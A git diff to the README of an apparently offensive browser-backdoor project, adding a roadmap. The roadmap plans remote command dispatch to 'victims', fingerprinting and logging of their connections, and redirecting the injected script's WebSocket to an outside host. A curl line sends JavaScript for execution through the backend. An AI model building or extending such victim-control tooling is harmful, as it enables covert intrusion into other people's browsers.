@@ -21,5 +21,11 @@ Inject the backdoor or serve backdoor.html and open it in a browser to test:
 Commands can be send by typing them in the backend_server.js-interface or doing a HTTP-call:
 <pre>curl 'http://localhost:1337/exec?alert("muahahahaha")'</pre>
 
+# TODO & Roadmap
+- backdoor must be built to only provide the URL to connect to if it was not already set. so that the url can be changed by adding an extra script-segment with "var socket = new WebSocket('ws://wereiwanttogo.com:1337')"
+- interface should take commands to be sent to victims.
+- a new connection should be fingerprinted and logged to a local file
+- interface with more layers to list and send commands specific to victim
+
 # Credits
 - Samy Kamkar for the inspiration through the Poisontab project and the code that provides the low-level base of the project.
